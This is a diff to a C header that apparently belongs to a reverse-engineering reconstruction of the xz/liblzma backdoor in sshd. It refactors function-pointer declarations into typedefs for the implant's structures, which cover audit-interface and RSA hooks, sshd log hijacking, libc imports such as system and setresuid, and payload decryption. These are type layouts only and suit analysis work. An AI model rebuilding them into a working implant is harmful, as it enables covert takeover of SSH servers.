@@ -122,14 +122,16 @@ typedef struct
   Elf64_Xword p_align;
 } Elf64_Phdr;
 
+typedef union
+{
+  Elf64_Xword d_val;
+  Elf64_Addr d_ptr;
+} Elf64_DynValue;
+
 typedef struct
 {
   Elf64_Sxword d_tag;
-  union
-    {
-      Elf64_Xword d_val;
-      Elf64_Addr d_ptr;
-    } d_un;
+  Elf64_DynValue d_un;
 } Elf64_Dyn;
 
 typedef struct
@@ -183,9 +185,13 @@ typedef struct bignum_ctx BN_CTX;
 
 typedef unsigned int point_conversion_form_t;
 
+typedef void *(*lzma_alloc_fn)(void *opaque, size_t nmemb, size_t size);
+
+typedef void (*lzma_free_fn)(void *opaque, void *ptr);
+
 typedef struct {
- void *(*alloc)(void *opaque, size_t nmemb, size_t size);
- void (*free)(void *opaque, void *ptr);
+ lzma_alloc_fn alloc;
+ lzma_free_fn free;
  void *opaque;
 } lzma_allocator;
 
@@ -233,21 +239,31 @@ struct La_x32_regs;
 
 struct La_x32_retval;
 
-struct audit_ifaces
-{
- void (*activity) (uintptr_t *, unsigned int);
- char *(*objsearch) (const char *, uintptr_t *, unsigned int);
- unsigned int (*objopen) (struct link_map *, Lmid_t, uintptr_t *);
- void (*preinit) (uintptr_t *);
- union
- {
+typedef void (*audit_activity_fn)(uintptr_t *, unsigned int);
+
+typedef char *(*audit_objsearch_fn)(const char *, uintptr_t *, unsigned int);
+
+typedef unsigned int (*audit_objopen_fn)(struct link_map *, Lmid_t, uintptr_t *);
+
+typedef void (*audit_preinit_fn)(uintptr_t *);
+
+typedef unsigned int (*audit_objclose_fn)(uintptr_t *);
+
+typedef void (*dl_audit_symbind_alt_fn)(struct link_map *l, const Elf64_Sym *ref, void **value, lookup_t result);
+
+typedef uintptr_t (*audit_symbind64_fn)(
+  Elf64_Sym *sym, unsigned int ndx,
+  uptr *refcook, uptr *defcook,
+  unsigned int flags, const char *symname);
+
+typedef union {
   uintptr_t (*symbind32) (Elf32_Sym *, unsigned int, uintptr_t *,
    uintptr_t *, unsigned int *, const char *);
   uintptr_t (*symbind64) (Elf64_Sym *, unsigned int, uintptr_t *,
    uintptr_t *, unsigned int *, const char *);
- };
- union
- {
+ } audit_symbind_fn_t;
+
+typedef union {
   Elf32_Addr (*i86_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
    uintptr_t *, struct La_i86_regs *,
    unsigned int *, const char *name,
@@ -261,9 +277,9 @@ struct audit_ifaces
    uintptr_t *, struct La_x32_regs *,
    unsigned int *, const char *name,
    long int *framesizep);
- };
- union
- {
+ } audit_pltenter_fn_t;
+
+typedef union {
    unsigned int (*i86_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
    uintptr_t *, const struct La_i86_regs *,
    struct La_i86_retval *, const char *);
@@ -278,8 +294,18 @@ struct audit_ifaces
    const struct La_x32_regs *,
    struct La_x86_64_retval *,
    const char *);
- };
- unsigned int (*objclose) (uintptr_t *);
+ } audit_pltexit_fn_t;
+
+struct audit_ifaces
+{
+ audit_activity_fn activity;
+ audit_objsearch_fn objsearch;
+ audit_objopen_fn objopen;
+ audit_preinit_fn preinit;
+ audit_symbind_fn_t symbind;
+ audit_pltenter_fn_t pltenter;
+ audit_pltexit_fn_t pltexit;
+ audit_objclose_fn objclose;
  struct audit_ifaces *next;
 };
 
@@ -637,6 +663,47 @@ enum dasm_modrm_mask {
  XZ_MODRM_RAW = 0x000000FF
 };
 
+typedef union __attribute__((packed)) {
+ struct __attribute__((packed)) {
+  u8 B : 1;
+  u8 X : 1;
+  u8 R : 1;
+  u8 W : 1;
+  u8 BitPattern : 4;
+ } bits;
+ u8 rex_byte;
+} x86_rex_prefix_t;
+
+typedef union __attribute__((packed)) {
+ struct __attribute__((packed)) {
+  u8 modrm;
+  u8 modrm_mod;
+  u8 modrm_reg;
+  u8 modrm_rm;
+ } breakdown;
+ u32 modrm_word;
+} x86_modrm_info_t;
+
+typedef struct __attribute__((packed)) {
+ u8 flags;
+ u8 flags2;
+ u8 prefix_padding[2];
+ u8 lock_rep_byte;
+ u8 seg_byte;
+ u8 osize_byte;
+ u8 asize_byte;
+ u8 vex_byte;
+ u8 vex_byte2;
+ u8 vex_byte3;
+ x86_rex_prefix_t rex;
+ x86_modrm_info_t modrm;
+} x86_prefix_fields_t;
+
+typedef union __attribute__((packed)) {
+ x86_prefix_fields_t decoded;
+ u16 flags_u16;
+} x86_prefix_state_t;
+
 /*
  * Hand-written x86 decoder used throughout the project to find instructions without shipping a full disassembler.
  * It records prefix bits, VEX/REX state, ModRM/SIB breakdowns, computed operands, and scratch fields so pattern searchers can share one structure.
@@ -644,40 +711,7 @@ enum dasm_modrm_mask {
 typedef struct __attribute__((packed)) dasm_ctx {
  u8* instruction;
  u64 instruction_size;
- union {
-  struct __attribute__((packed)) {
-   u8 flags;
-   u8 flags2;
-   u8 prefix_padding[2];
-   u8 lock_rep_byte;
-   u8 seg_byte;
-   u8 osize_byte;
-   u8 asize_byte;
-   u8 vex_byte;
-   u8 vex_byte2;
-   u8 vex_byte3;
-   union {
-    struct __attribute__((packed)) {
-     u8 B : 1;
-     u8 X : 1;
-     u8 R : 1;
-     u8 W : 1;
-     u8 BitPattern : 4;
-    } bits;
-    u8 rex_byte;
-   } rex;
-   union {
-    struct __attribute__((packed)) {
-             u8 modrm;
-             u8 modrm_mod;
-             u8 modrm_reg;
-             u8 modrm_rm;
-    } breakdown;
-    u32 modrm_word;
-   } modrm;
-  } decoded;
-  u16 flags_u16;
- } prefix;
+ x86_prefix_state_t prefix;
  u8 imm64_reg;
  u8 sib_byte;
  u8 sib_scale_bits;
@@ -737,27 +771,51 @@ typedef struct __attribute__((packed)) elf_info {
  u32 *gnu_hash_chain;
 } elf_info_t;
 
+typedef size_t (*pfn_malloc_usable_size_t)(void *ptr);
+
+typedef uid_t (*pfn_getuid_t)(void);
+
+typedef void (*pfn_exit_t)(int status);
+
+typedef int (*pfn_setresgid_t)(gid_t rgid, gid_t egid, gid_t sgid);
+
+typedef int (*pfn_setresuid_t)(uid_t ruid, uid_t euid, uid_t suid);
+
+typedef int (*pfn_system_t)(const char *command);
+
+typedef ssize_t (*pfn_write_t)(int fd, const void *buf, size_t count);
+
+typedef int (*pfn_pselect_t)(
+  int nfds, fd_set *readfds, fd_set *writefds,
+  fd_set *exceptfds, const struct timespec *timeout,
+  const sigset_t *sigmask);
+
+typedef ssize_t (*pfn_read_t)(int fd, void *buf, size_t count);
+
+typedef int *(*pfn___errno_location_t)(void);
+
+typedef int (*pfn_setlogmask_t)(int mask);
+
+typedef int (*pfn_shutdown_t)(int sockfd, int how);
+
 /*
  * Resolved libc entrypoints used by the implant (pselect/read/write/setresgid/etc.) along with the book-keeping counters for how many symbols were patched successfully.
  */
 typedef struct __attribute__((packed)) libc_imports {
  u32 resolved_imports_count;
  u8 _unknown993[4];
- size_t (*malloc_usable_size)(void *ptr);
- uid_t (*getuid)(void);
- void (*exit)(int status);
- int (*setresgid)(gid_t rgid, gid_t egid, gid_t sgid);
- int (*setresuid)(uid_t ruid, uid_t euid, uid_t suid);
- int (*system)(const char *command);
- ssize_t (*write)(int fd, const void *buf, size_t count);
- int (*pselect)(
-  int nfds, fd_set *readfds, fd_set *writefds,
-  fd_set *exceptfds, const struct timespec *timeout,
-  const sigset_t *sigmask);
- ssize_t (*read)(int fd, void *buf, size_t count);
- int *(*__errno_location)(void);
- int (*setlogmask)(int mask);
- int (*shutdown)(int sockfd, int how);
+ pfn_malloc_usable_size_t malloc_usable_size;
+ pfn_getuid_t getuid;
+ pfn_exit_t exit;
+ pfn_setresgid_t setresgid;
+ pfn_setresuid_t setresuid;
+ pfn_system_t system;
+ pfn_write_t write;
+ pfn_pselect_t pselect;
+ pfn_read_t read;
+ pfn___errno_location_t __errno_location;
+ pfn_setlogmask_t setlogmask;
+ pfn_shutdown_t shutdown;
  void *__libc_stack_end;
 } libc_imports_t;
 
@@ -771,67 +829,121 @@ typedef void (*pfn_RSA_get0_key_t)(
  const RSA *r,
  const BIGNUM **n, const BIGNUM **e, const BIGNUM **d);
 
+typedef void (*pfn_DSA_get0_pqg_t)(
+  const DSA *d, const BIGNUM **p,
+  const BIGNUM **q, const BIGNUM **g);
+
+typedef const BIGNUM *(*pfn_DSA_get0_pub_key_t)(const DSA *d);
+
+typedef size_t (*pfn_EC_POINT_point2oct_t)(
+  const EC_GROUP *group, const EC_POINT *p,
+  point_conversion_form_t form, unsigned char *buf,
+  size_t len, BN_CTX *ctx);
+
+typedef EC_POINT *(*pfn_EC_KEY_get0_public_key_t)(const EC_KEY *key);
+
+typedef const EC_GROUP *(*pfn_EC_KEY_get0_group_t)(const EC_KEY *key);
+
+typedef EVP_MD *(*pfn_EVP_sha256_t)(void);
+
+typedef int (*pfn_BN_num_bits_t)(const BIGNUM *a);
+
+typedef EVP_PKEY *(*pfn_EVP_PKEY_new_raw_public_key_t)(
+  int type, ENGINE *e,
+  const unsigned char *key, size_t keylen);
+
+typedef EVP_MD_CTX *(*pfn_EVP_MD_CTX_new_t)(void);
+
+typedef int (*pfn_EVP_DigestVerifyInit_t)(
+  EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,
+  const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);
+
+typedef int (*pfn_EVP_DigestVerify_t)(
+  EVP_MD_CTX *ctx, const unsigned char *sig,
+  size_t siglen, const unsigned char *tbs, size_t tbslen);
+
+typedef void (*pfn_EVP_MD_CTX_free_t)(EVP_MD_CTX *ctx);
+
+typedef void (*pfn_EVP_PKEY_free_t)(EVP_PKEY *key);
+
+typedef EVP_CIPHER_CTX *(*pfn_EVP_CIPHER_CTX_new_t)(void);
+
+typedef int (*pfn_EVP_DecryptInit_ex_t)(
+  EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,
+  ENGINE *impl, const unsigned char *key, const unsigned char *iv);
+
+typedef int (*pfn_EVP_DecryptUpdate_t)(
+  EVP_CIPHER_CTX *ctx, unsigned char *out,
+  int *outl, const unsigned char *in, int inl);
+
+typedef int (*pfn_EVP_DecryptFinal_ex_t)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);
+
+typedef void (*pfn_EVP_CIPHER_CTX_free_t)(EVP_CIPHER_CTX *ctx);
+
+typedef const EVP_CIPHER *(*pfn_EVP_chacha20_t)(void);
+
+typedef RSA *(*pfn_RSA_new_t)(void);
+
+typedef BIGNUM *(*pfn_BN_dup_t)(const BIGNUM *from);
+
+typedef BIGNUM *(*pfn_BN_bin2bn_t)(const unsigned char *s, int len, BIGNUM *ret);
+
+typedef int (*pfn_RSA_set0_key_t)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);
+
+typedef int (*pfn_EVP_Digest_t)(
+  const void *data, size_t count, unsigned char *md,
+  unsigned int *size, const EVP_MD *type, ENGINE *impl);
+
+typedef int (*pfn_RSA_sign_t)(
+  int type,
+  const unsigned char *m, unsigned int m_len,
+  unsigned char *sigret, unsigned int *siglen, RSA *rsa);
+
+typedef int (*pfn_BN_bn2bin_t)(const BIGNUM *a, unsigned char *to);
+
+typedef void (*pfn_RSA_free_t)(RSA *rsa);
+
+typedef void (*pfn_BN_free_t)(BIGNUM *a);
+
 /*
  * All non-libc function pointers the payload needs (RSA/EVP/BN helpers, chacha decrypt, etc.) plus access to the owning `libc_imports_t` so callers can reach both sets via one pointer.
  */
 typedef struct __attribute__((packed)) imported_funcs {
  pfn_RSA_public_decrypt_t RSA_public_decrypt;
  pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA;
- void (*RSA_get0_key_null)(
-  const RSA *r, const BIGNUM **n,
-  const BIGNUM **e, const BIGNUM **d);
+ pfn_RSA_get0_key_t RSA_get0_key_null;
  pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt;
  pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt;
  pfn_RSA_get0_key_t *RSA_get0_key_plt;
- void (*DSA_get0_pqg)(
-  const DSA *d, const BIGNUM **p,
-  const BIGNUM **q, const BIGNUM **g);
- const BIGNUM *(*DSA_get0_pub_key)(const DSA *d);
- size_t (*EC_POINT_point2oct)(
-  const EC_GROUP *group, const EC_POINT *p,
-  point_conversion_form_t form, unsigned char *buf,
-  size_t len, BN_CTX *ctx);
- EC_POINT *(*EC_KEY_get0_public_key)(const EC_KEY *key);
- const EC_GROUP *(*EC_KEY_get0_group)(const EC_KEY *key);
- EVP_MD *(*EVP_sha256)(void);
+ pfn_DSA_get0_pqg_t DSA_get0_pqg;
+ pfn_DSA_get0_pub_key_t DSA_get0_pub_key;
+ pfn_EC_POINT_point2oct_t EC_POINT_point2oct;
+ pfn_EC_KEY_get0_public_key_t EC_KEY_get0_public_key;
+ pfn_EC_KEY_get0_group_t EC_KEY_get0_group;
+ pfn_EVP_sha256_t EVP_sha256;
  pfn_RSA_get0_key_t RSA_get0_key;
- int (*BN_num_bits)(const BIGNUM *a);
- EVP_PKEY *(*EVP_PKEY_new_raw_public_key)(
-  int type, ENGINE *e,
-  const unsigned char *key, size_t keylen);
- EVP_MD_CTX *(*EVP_MD_CTX_new)(void);
- int (*EVP_DigestVerifyInit)(
-  EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,
-  const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);
- int (*EVP_DigestVerify)(
-  EVP_MD_CTX *ctx, const unsigned char *sig,
-  size_t siglen, const unsigned char *tbs, size_t tbslen);
- void (*EVP_MD_CTX_free)(EVP_MD_CTX *ctx);
- void (*EVP_PKEY_free)(EVP_PKEY *key);
- EVP_CIPHER_CTX *(*EVP_CIPHER_CTX_new)(void);
- int (*EVP_DecryptInit_ex)(
-  EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,
-  ENGINE *impl, const unsigned char *key, const unsigned char *iv);
- int (*EVP_DecryptUpdate)(
-  EVP_CIPHER_CTX *ctx, unsigned char *out,
-  int *outl, const unsigned char *in, int inl);
- int (*EVP_DecryptFinal_ex)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);
- void (*EVP_CIPHER_CTX_free)(EVP_CIPHER_CTX *ctx);
- const EVP_CIPHER *(*EVP_chacha20)(void);
- RSA *(*RSA_new)(void);
- BIGNUM *(*BN_dup)(const BIGNUM *from);
- BIGNUM *(*BN_bin2bn)(const unsigned char *s, int len, BIGNUM *ret);
- int (*RSA_set0_key)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);
- int (*EVP_Digest)(
-  const void *data, size_t count, unsigned char *md,
-  unsigned int *size, const EVP_MD *type, ENGINE *impl);
- int (*RSA_sign)(
-  int type,
-  const unsigned char *m, unsigned int m_len,
-  unsigned char *sigret, unsigned int *siglen, RSA *rsa);
- int (*BN_bn2bin)(const BIGNUM *a, unsigned char *to);
- void (*RSA_free)(RSA *rsa);
- void (*BN_free)(BIGNUM *a);
+ pfn_BN_num_bits_t BN_num_bits;
+ pfn_EVP_PKEY_new_raw_public_key_t EVP_PKEY_new_raw_public_key;
+ pfn_EVP_MD_CTX_new_t EVP_MD_CTX_new;
+ pfn_EVP_DigestVerifyInit_t EVP_DigestVerifyInit;
+ pfn_EVP_DigestVerify_t EVP_DigestVerify;
+ pfn_EVP_MD_CTX_free_t EVP_MD_CTX_free;
+ pfn_EVP_PKEY_free_t EVP_PKEY_free;
+ pfn_EVP_CIPHER_CTX_new_t EVP_CIPHER_CTX_new;
+ pfn_EVP_DecryptInit_ex_t EVP_DecryptInit_ex;
+ pfn_EVP_DecryptUpdate_t EVP_DecryptUpdate;
+ pfn_EVP_DecryptFinal_ex_t EVP_DecryptFinal_ex;
+ pfn_EVP_CIPHER_CTX_free_t EVP_CIPHER_CTX_free;
+ pfn_EVP_chacha20_t EVP_chacha20;
+ pfn_RSA_new_t RSA_new;
+ pfn_BN_dup_t BN_dup;
+ pfn_BN_bin2bn_t BN_bin2bn;
+ pfn_RSA_set0_key_t RSA_set0_key;
+ pfn_EVP_Digest_t EVP_Digest;
+ pfn_RSA_sign_t RSA_sign;
+ pfn_BN_bn2bin_t BN_bn2bin;
+ pfn_RSA_free_t RSA_free;
+ pfn_BN_free_t BN_free;
  libc_imports_t *libc;
  u32 resolved_imports_count;
  u32 reserved_imports_padding;
@@ -914,6 +1026,8 @@ typedef void (*log_handler_fn)(
  const char *msg,
  void *ctx);
 
+typedef void (*mm_log_handler_fn)(LogLevel level, int forced, const char *msg, void *ctx);
+
 /*
  * Captures the moving pieces required to hook sshd’s logging path, including the original handler, replacement trampolines, format strings, and guard booleans to keep syslog stable.
  */
@@ -932,7 +1046,7 @@ typedef struct __attribute__((packed)) sshd_log_ctx {
  log_handler_fn orig_log_handler;
  void *orig_log_handler_ctx;
  void *sshlogv;
- void (*mm_log_handler)(int level, int forced, const char *msg, void *ctx);
+ mm_log_handler_fn mm_log_handler;
 } sshd_log_ctx_t;
 
 /*
@@ -1050,7 +1164,7 @@ typedef struct __attribute__((packed)) ldso_ctx {
  struct audit_ifaces hooked_audit_ifaces;
  u8 _unknown1538[0x30];
  char **libcrypto_l_name;
- void (*_dl_audit_symbind_alt)(struct link_map *l, const Elf64_Sym *ref, void **value, lookup_t result);
+ dl_audit_symbind_alt_fn _dl_audit_symbind_alt;
  size_t _dl_audit_symbind_alt__size;
  pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
  pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;
@@ -1080,13 +1194,10 @@ typedef struct __attribute__((packed)) backdoor_hooks_ctx {
  u8 _unknown1621[0x30];
  backdoor_shared_globals_t *shared;
  backdoor_hooks_data_t **hooks_data_addr;
- uintptr_t (*symbind64)(
-  Elf64_Sym *sym, unsigned int ndx,
-  uptr *refcook, uptr *defcook,
-  unsigned int flags, const char *symname);
+ audit_symbind64_fn symbind64;
  pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
  pfn_RSA_get0_key_t hook_RSA_get0_key;
- log_handler_fn mm_log_handler;
+ mm_log_handler_fn mm_log_handler;
  u8 _unknown1631[sizeof(void *)];
  u8 _unknown1632[sizeof(void *)];
  sshd_monitor_func_t mm_answer_keyallowed;
@@ -1402,17 +1513,23 @@ typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {
  ptrdiff_t tls_get_addr_random_symbol_got_offset;
 } backdoor_tls_get_addr_reloc_consts_t;
 
+typedef int (*init_hook_functions_fn)(backdoor_hooks_ctx_t *funcs);
+
+typedef void *(*elf_symbol_get_addr_fn)(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+
+typedef BOOL (*elf_parse_fn)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
+
 /*
  * Mini vtable exported back into liblzma that holds callable helpers (initializing hook structs, parsing an ELF header, resolving symbols) so the stage-two code can reuse our C helpers.
  */
 typedef struct __attribute__((packed)) elf_functions {
  u64 reserved_before_init;
- int (*init_hook_functions)(backdoor_hooks_ctx_t *funcs);
+ init_hook_functions_fn init_hook_functions;
  u64 reserved_before_symbol_lookup_0;
  u64 reserved_before_symbol_lookup_1;
- void *(*elf_symbol_get_addr)(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+ elf_symbol_get_addr_fn elf_symbol_get_addr;
  u64 reserved_before_elf_parse;
- BOOL (*elf_parse)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
+ elf_parse_fn elf_parse;
 } elf_functions_t;
 
 /*
@@ -1603,10 +1720,17 @@ extern BOOL secret_data_append_item(
  unsigned shift_count,
  int index, u8 *code);
 
+typedef BOOL (*secret_data_appender_fn)(
+  secret_data_shift_cursor_t shift_cursor,
+  unsigned operation_index,
+  unsigned shift_count,
+  int index,
+  u8 *code);
+
 extern BOOL secret_data_append_items(
  secret_data_item_t *items,
  u64 items_count,
- BOOL (*appender)(secret_data_shift_cursor_t, unsigned, unsigned, int, u8 *));
+ secret_data_appender_fn appender);
 
 extern BOOL secret_data_append_from_address(
  void *addr,
